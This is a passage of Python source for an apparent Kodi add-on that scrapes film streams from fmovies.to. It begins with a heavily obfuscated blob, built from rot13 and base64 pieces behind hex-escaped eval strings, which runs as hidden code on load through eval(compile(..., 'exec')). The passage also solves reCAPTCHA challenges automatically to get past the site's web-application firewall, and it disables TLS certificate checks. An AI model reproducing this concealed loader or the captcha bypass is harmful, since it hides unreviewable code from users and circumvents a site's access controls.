wL2AmD3ZmH3AQR0Mwp5AmV3ZQplAmR3AQL1ZmD0AQH2Zmx1ZwD2AmR0MQD3AmpmZmpmAmNmZGHjAwR3ZQplAGZ3AQLlAwL2MGLkZmL2MGH3AQV2AQZmA2R1AwHkAwLlLwLkAmxmZmH3AJR2AwMxAGt0AwEzATR2MQHjAGH3ZmZ2AQx3ZQZ1AQt3ZQZ1ZmZ1ZQL1AmN2MGplATD0MGquAmt2AwMzAGVmBGH0AQDmAQHkAQDmAGMuAmL1ZGMyAwR1AGD5AwL2MGZ1ATHmBQD4AmV3BQZkAmV1ZwHlAwDmZQMzAGx2ZwZjAGLmAwquZmp0LmpkAmxmAmp3AGR2AQMzAwV0AGp4AwD2AwWzAzLmAQZlZmV2ZmZ5ZzL0MQp4AwR3AwL3AGZmBGH4ATD2AGZ2Az'
oracle = 'I2ZTRhNDU2ZTU5NjYzMjM0Njc1YTcyNzY1MjdhNWE1ODUxNjg0MzUzNmE0ZDRlNzU1MjQ2NGI1MjZkNzUyZjMxNzA0MzY2NWEzMjY5NDk3ODcwMzI2NzRjNDEzMjM5MzYzOTU5NGE3MjU4NTI0Yjc5NDk1MDUxNDk3NDcwMzY3NDRhNDk2MTM2NmU0YzU2NDI0NzQ2Nzg2ZTRiNDI2MjY0Mzc1YTY3MmY0NzM0Mzc1MTYzNDU3NTU3MzA1NjY1NDM2NTU2NzAzNjRlNDM2MTU3NmM0ZTQzNGU2ZjU0NTM0ZTQxNTQ1ODQ1MzE1YTY0NjE2MTY4Njc3OTMxNWEyZjZkNDY3MDMwNmE2YTY4NGY2ODQ3NGM1MjU5NzE0NzU2NTM3MjM5NjE0YzVhNjU1MTQzNzMzODZjNWE0ZDQ4NTc2ZDc5MzA2OTQ5NWE0NjczNjc2ZDcyNTM2MjQ1NDI3MjZhNTA3NjU5NTk1ODc1NmUzOTQ1NmE0NDU5MzE3NjZlNDU1MDcwNTE0NzZiNGM1MTRjNTIyZjY4NTg2ZjM0NjM0OTQ5NjU1OTJiNzg0ZTMyNTE0ZjczNDg0ZjZjNGQzOTRkNzU2YjMxNTQ0OTcwMzI2NTYxNTg2ODRhNzczMDM1NjE1NTY5NGE3MjYyNjI1MzZmNzc3NDQzNDE2ZjUxNGU3NzU4NjY0YTMxNmM3NTMzMzY3NDY4NDg3MzczNTUzMDU2NzI3MDZjNWE0Yzc0NDk2OTQ1NGU3MDYxNDY1NjQ0NGQzNTUzNjg2ODcyNjE0YjQzNTE3MDRiMzQ3NzZjNTMzMDUyNDEzMjM0NTM0NjQzNGQ1OTU0NmQ1MTRhNGU3NTcxNTE2ZTc4NTQ0NjQxNjQ3NjM1MzA2NzU5NGM1NDQ1NGM2OTQ2NjM2YTY3Nzk3NzZlNzA0MzY2NTMyZjMxNDI2ZTZhMzQ2ODQ3NGU0YTY2NTQ1MDc5NmM2ODRhNjg0Mjc0MzIzNzc0MzI2MjRhNTg2MjQ1NGQ0ODUxNmQ0ZTcyNTE2ZDM0NmM1Mjc4NGU3MzU5NTM3NTMwMmI3NjcxNjU0YzU0Njk2ODQyNDU3NDQ0MzY3MDcwNjY0NDUzNmI1NDU3NmE2MzMwNDQ0NTM0NDk1Nzc2NGU0NDRmNTU3NDQzNzUzNDU0NjkzMjQ0NGE2NjUzNDE2NjMyMzQ2MzZhNDQzMDZjNDI2YzQ3Njg0ZjM2NDg3YTU2NDU1MjQzNjk3MTZjNzA0MTYyMzU0NTYzMzk2Mzc3NTM1Mzc4NzE0ZjQ3NDU1MDUyNTk2OTY2N2E0YTcxNTE1NzY2MzY0YjY2MmI2MjRiNTc2ODQxNDU0YTU0NDc3NjRiNjE1NzZlNzI3MzZmMzIzMDc0MzM1NjZmNTQ1YTRkNzY1MjQyNzY1MTMwMzI2MjUwNGUzMTZhMzc1NDM4NDc0ZTQ3NzU1OTdhNjE2NjcxNmQ1ODMwNTM1MDMwNTA1OTMzNTE2MTQyNjQ1OTZmN2E2OTQzNGI0MTc2NTM0ZDU1NzgzODYzNGE1MjQyNjE0YTc3NTE0YzY2NTc2YTM5N2E0NzMxNjY2NjZkNTM0NTRlNTk1ODZjNGIzOTQ4NTE2ZjUyNTM0ZTU3NTEyZjZhNjM2NzQ1NzgzMDMzMzg2MjZmNGM1NTU4NDQzMDM2NjM3MjUzMzk0NTM5NGI0NzUwMzI1NzQ1NTI0ZTZlMzYzNjMzNzQ0NjYxNGM2OTZiNjYyYjQzNjM2NjY4NmY3ODYyNjQzNDQ5NDY2NTUzNDU1YTRkNjc1ODM3NjI2MTZkNDg1NzY2MzI0MjQyMmY3MDU1NjQ3NzU4NzQ1MDQ5MzE0YjZlNDk3MjZhNmY0YzcxNjE1MjMzNzQ1MjU1MzY2YTY3NmM0YTQ0Njc0OTU0MzQ2MjQxMzE3MDU1MzUyZjcwMzE3NDQ2MmI1MDQyNDk2OTcwNjYzNDM0NzU3MTZmNmY1MjMwNGM3MDQ1MmY1MTMwNjM2ODU0NDU2YjUxNzg0ODRlNDI3ODc4Nzg0YzUyNDg2NzJmNzI0ZTM5NDM2OTRjNTYzOTcxMzc0ODZjNzMzNTRiN2EzMjc5NDEyZjMyMmI0ZTMwNDc2NjYxNTE1NTM3MzE0MzRkMmY2NjQ1NjQ0OTU2NjM0YTMyNjQ0ZTc5NjgzMzQ1Nzk0ZjQxNDU2OTZlNDk2YTc4NDY0YjQ5Mzg1MTUwMzgyYjczNDM1MTU4Nzk3NTUyMzU2ODM5NTk1MzUxMzE2YzZmNjUzMjY1NTM1MDZhNDM2NTMwNDczODRhNzczMjcwNjY3MDUyMzk3MTc2NDM0MjZlNGY0YTZiNjk0YzMwNDg0MjRkNjY2NjUyNjY0OTMwNDg3MzZhNjI2ODUxNDU3NDZmNTU3MzQxNjQ0MzY2NGU1MTZlMzc2MzYxNjI3ODY3NmYzNzdhMzk0MjM2MzE3NDQxNzM1MjdhNjc2NTZmNTYzMzQ3NDQ1NjRlNDQ1NzcyNTcyYjZhNmY1NDJiNzc0YTYzMzE1MTU0NmUzMDczMzQ2ZjZhNGQ0MTMzNmE1NDQ4MzU0ODY1NjU3MTUyNGE0NzRkNTUzNDJiNGIzNDMxNmM0MzU5MzU2YzRmNTA1NzU0NGI0ZjQ0NDY1MDcxNjQ2NTc2NTE2YTdhNGQ3NDRhMzk3MTM2MzE2ZjY1Njg1MjM0NTYzNjcyNGI0ODZhNjc3MTU1NjgyYjVhNGE3ODRkNjEyYjZmNTgzMDU4MmYzNDU2Njg0Mzc4N2E0Zjc1MzA3OTRkMzczNzQ1MzMzOTUzNmI0YzMzNzM3NzZjNjk3MDMxMzQ0YTM5NjU3Mjc2NGY0NDQ5MzU2NzMzMzc3MTQ4MmY3NDU4NDg0YTQ1Nzk3YTc0NzQ2MTYyMzQ1NDM2NGY0MzcyNDI0Zjc2Njg2NTUwMzk2YjU4MzQ1NjUxMzkzNjc0NGM3ODZiNTg0NzQ4Mzk3MDRhNzA0NzRhNGU2YTU2NjM1ODU5NGQzODU4NDI1NjQyNDQ2OTMxNmE2MTc0MzQ1NTQ4NmY2MTMwMzA2ZjU2NTkyZjU3NDM0NDZiNjk0Njc1NmYzNDUzMzI2ODRmNTEzNzcxNmQ2ODY4NzA3MDM5MzM2ZjMwNzg1ODY4NGM3MTRhNGY2YTYxNzQ3MTQ3NDg2YzZiMzY0NTMzMmY1MDZhNGQ3NjZkNjU2ZjRjNTk2MzRiNTk2NTQ4NTI0ZTY5MzE1MzRkMmYzNzU3NjMzNjY0NzU2ODM4NGQ0ZTRhMmY0NTQ3MmI3NzZlMzQzNzZhNmIzNTc3MzA3YTVhNTQ2MjY0Njg2ZjZjNzc0ODJmNTg2ODRmNTkzNTMwNzQ1YTc4NDI1MDM1NGYzNjRjNzE1NTQ2NmI2NjY2NmE0ZDJiNDk0MzJmNDE0NDJiNmE3NDc5NDk3MTQ2MmY2YTZmNzI0OTZkMzQ2MjU5NGU1ODUzNmUyZjU1NDg0NDc0NzQ1MTY2MzMyZjc2NjU0MjUwNjY1NzQ4NDE3NDc0NDM2MTU2NGY0OTM1NDkzMDZkMmI1MjQ0NTc0MjY4MmI3NzQ4NzczMjZhNTQ0OTQ5NjM1NDRjMzI2MzUyNTMyZjM1NTE2NzQ4NjQ0YTQxMmY0ZTU1MzU3ODUxNzg2YzM2NDY0YjRjNjY2YjMxMzc0NzYyMzk2ODUwNzI2NTU1Nzg1NDRiNTAzMTY3NzQ0MTMyNTIyYjRjNDc0Njc3NTI3MTQ5NGEzOTRmNjQ0NDQxNjY0ZDYzMzY1MTYyMmY3MTRhNDg2OTU4NDI3NjJiNjk3NjRhNjU2ZTY3Njk0OTY1NTE3MjM3NTIzMDY2NDUzNjVhMzkzMzU3NjM1OTM2Nzg0ODZlNDY2NDY2NmY3OTM3NjE1MjU1N2EzNDZjNmUzNzQ4NGQ1MTM2Njg2MTZiNjQyZjU0Mzk2ZTM2NDg2OTQ2NTM1NTJiNzQ2MTM1N2E1ODM2NTA2NTc4NGE3ODMyNDM0ZjZjNzM1NDU4MzY0NjU0NGMzOTMyNzUzMDdhNzA0NTU5Mzc1OTM1NTE1MDMwNjY0ZjY4NjE1YTMzNDc2YTMwNGM2Yjc5NGQ3ODMyNzA0OTY1NzQ1NzZmNmY3NjRlNDQ3ODU3NTU1MDZkNGM2ZTJiNzk2ZjUwMzA0OTJiNzE0MzY0NjE0Yzc1NDU3NjZkNmU2ZTMyNmMyYjZmNWEzMDRjNGIzNDRhNjY1MTc1NjY3MTRiNzEzOTUxNmU1OTM0NzczMzUxNjM2OTZhN2E2Yzc2NTY0MjRmNGU2ZTJmNDU2YjQ1N2E3NDRmNmE0YzRkNzE0YzQ5Nzc1NjQ0NmE3OTUxNTE2ZDMzNTEzODZmNTYzMjc5NDQ2ODY5NzI2MTU1NTQ0MjZiNjY2OTZmNDk1ODU0MzYzMTY1Nzk2ZTU4NzY2ODU0NDE0YTMyNTA3NDZjNTA2MzM1NDM2OTUwN2E3OTZjNTAzNTY3NzU0ZjMyNmI3NjcxNmUzNzYxNmE1MjM4NDQ2Nzc0Mzc0MzMxNGM0MjZkNjYzNjY5MmIzNzUxNDYzMjU0NjEyYjY4NjE2YTMwNzk2ZTUwNGQ0YjM4NTA0ZDcxNzYzMDUxMzE3YTU2MzYzNTQ4NGQ0NDZlNzA3MTdhMzE2MjZhNzc0YzMwMzY0NjY0NDQzNDRlNTQ2YTcxNGYzMzU0NzA1NzM5MzY3YTQ4NjUzMDUwMmY2OTMxNzI3NTc2MzA2NTQyNzg3OTcwNjQzMTc4Mzk0NDU3NGU3MTc0NGI3NjQ1NTkzOTUwNjUzNDQ5NjQ3MzZhMzU2YTY2NjE0NDdhNDIzMjczNzYzMTZmNTgzMDQyNzgzMDUwNjgzMjZiNTU1NDU0Mzg2YzRjMzY3ODUwNTQ3NDVhNmI1MDM1NTE1MjM0Njg3ODQ4NmU1OTc3NzI0ODQ0NTg1MTcyNmQ3NjM5NDU3NzZmMzk1NzZjNGU2NjUwMzI0ODY4MzY0YTc2Nzk1NzYyNzM2MzYxNTg3NDM2NzQ0YjUzMmI1MjcxNzk3MzcxMmY1MzM0NTM2MzYzNmM0ZTU5MzI1MTQ3NTg2MzM1Njk3NDRlNzg1NDYzNjQ2NDUzMzg3NDMxNmU0ZjZmNzE3MDU1NjY0NTMyMmI2ZDZlNGE1NjRlMzk1MzU2NzMzMzcwNzQ0NzRkMzk3YTU3MzY1YTU2N2E1ODY2NGM0YTc1NTkzMzdhNjkzMTY0NGE2YTUyNWEzMDMzMzY0MTM5MzYzOTQ3NjQ1MDYzNmQ1MzY0NmY0Zjc2NTgzMzMwNjY1NjMyNDkzODZhNzIzNjJmNTI1MjYzNmIzODU2NjI0Mzc1NGE0ODMzNGY0YTQ3NjY1NzQyMzY3OTMzNTc1MTJmNmY1NTY1NmM0MTJiNTU3YTc4NmM1MzRmNzk2NzY5NTAyYjUxNjYzODU1NTk0YjY2MzE3NzM5NDU3NzM3NmU2YjRmMzk1NTc3MmYyYjUwNzA3MDY3NzEyZjQ4NTIzNTUxMzczNDJiNDM2MjJmNmI2YjQ4NTIzNzJiMzEyZjcwNmI1MTM2MzE1ODUxNzM2NDQ2MzA2MTU0NmM3ODY4NDY1NjUzNzY2YzRjMmY2ODQ1NjU1MDYyNDU2N'
keymaker = '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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))  
  
def getVerid(id):

    #ab='aaaaaa'#AAAAAAAAAA'#ABBDEEBBAABBAABB'#ggo()
    ab = 'DZmuZuXqa9O0z3b7'
    #ab='WeXfYR'

    
#   id = '41lj7'
    ac = id
    hj = dekoduj(ab,ac) #
    hja1 = dekodujNowe (ab,ac)

    if sys.version_info >= (3,0,0):
        hj=hj.encode('Latin_1')

    hj2 = encode2(hj)   

    

    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
        

    #hjkl = ab + hj2
    hjkl = hj2
    return hjkl
    
def getLinks(exlink):
    href,id = exlink.split('|')

    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    result = parseDOM(html, 'section', attrs={'class': "info"})[0]  
    plot = parseDOM(result, 'div', attrs={'itemprop': "description"})
    plot = PLchar(plot[0]) if plot else ''
    imag = parseDOM(result, 'img', ret='src')#[0]
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''

    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''

    countries = re.findall('Country\:(.+?)<\/div>',result) # 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''

    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''

    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''

    yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
    yr = yr[0].strip().split('-')[0] if yr else ''
    infol = {'plot':PLchar(plot),'genre': genre,'country':country,'duration':tim,'year':yr}

    headers.update({'Referer': href})
    
    #id = '41lj7' #################################

    verid = getVerid(id)
    recap="03AGdBq25eDJkrezDo2y"
    params = (
        ('id', id),
       # ('verified', verid),
        ('vrf', verid),
        ('token', recap),
    )

    response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, verify=False)#
    
    html= (response.content)
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')

    if 'sitekey=' in html:

        sitek=re.findall('data\-sitekey="(.+?)"',html)[0]

        token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')

        data = {
                'g-recaptcha-response': token}
        
        response = sess.post('https://fmovies.to/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)#
        
        params = (
            ('id', id),
            ('token', token),
        )
        response = sess.get('https://fmovies.to/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)#

    html = (response.content)#.replace('\\"','"')
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    html= html.replace('\\"','"')


    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',html)
    for linkid1,host in linki:
        tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+' [B][/COLOR][/B]'

        linkid = re.findall(linkid1+'"\:"([^"]+)',html)#[0]
        if linkid:
            add_item(name=PLchar(tyt), url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
    
    


    if len(linki)>0:

        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Error[/B]', 'No content to display',xbmcgui.NOTIFICATION_INFO, 8000,False)
        
def dec(chra):

    try:    
        if sys.version_info >= (3,0,0):
            chra =repr(chra.encode('utf-8'))
            chra = chra.replace('\\xc3\\xaa','ę').replace('\\xc3\\x8a','Ę')
            chra = chra.replace('\\xc3\\xa6','ć').replace('\\xc3\\x86','Ć')
            chra = chra.replace('\\xc2\\xbf','ż').replace('\\xc2\\x9f','Ż')
            chra = chra.replace('\\xc2\\xb9','ą').replace('\\xc2\\x99','Ą')
            
            chra = chra.replace('\\xc5\\x93','ś').replace('\\xc5\\x92','Ś')
            chra = chra.replace('\\xc3\\xb3','ó').replace('\\xc3\\x93','Ó')
            
            chra = chra.replace('\\xc5\\xb8','ź').replace('\\xc5\\xb7','Ź')
            
            chra = chra.replace('\\xc2\\xb3','ł').replace('\\xc2\\x93','Ł')
            
            chra = chra.replace('\\xc3\\xb1','ń').replace('\\xc3\\x91','Ń')
            chra = chra .replace("b\'",'')

            chra = chra .replace("\\n",'\n').replace("\\r",'\r') 
            chra = chra .replace("\\'","'")

        else:

            chra = chra.replace('\xc3\xaa','ę').replace('\xc3\x8a','Ę')
            chra = chra.replace('\xc3\xa6','ć').replace('\xc3\x86','Ć')
            chra = chra.replace('\xc2\xbf','ż').replace('\xc2\x9f','Ż')
            chra = chra.replace('\xc2\xb9','ą').replace('\xc2\x99','Ą')
            
            chra = chra.replace('\xc5\x93','ś').replace('\xc5\x92','Ś')
            chra = chra.replace('\xc3\xb3','ó').replace('\xc3\x93','Ó')
            
            chra = chra.replace('\xc5\xb8','ź').replace('\xc5\xb7','Ź')
            
            chra = chra.replace('\xc2\xb3','ł').replace('\xc2\x93','Ł')
            
            chra = chra.replace('\xc3\xb1','ń').replace('\xc3\x91','Ń')



    except:
        pass
        
    return chra
    
def transPolish(subtlink):

    try:
        response = sess.get(subtlink, headers=headers, verify=False)#.content

        if sys.version_info >= (3,0,0):
        
            response  = response.text
        else:
            response  = response.content
        gg=dec(response)

        open(napisy, 'w').write(gg)

        return True
    except:
        return False
    
def PlayLink(exlink):
    id,href = exlink.split('|')

    params = (
        ('id', id),
    )

    headers.update({'Referer': href})
    response = sess.get('https://fmovies.to/ajax/episode/info', headers=headers, params=params, verify=False)#

    ab=response.content
    if sys.version_info >= (3,0,0):
        ab = ab.decode(encoding='utf-8', errors='strict')
    
    
    try:
        jsonab = json.loads(ab)
    except:
        pass
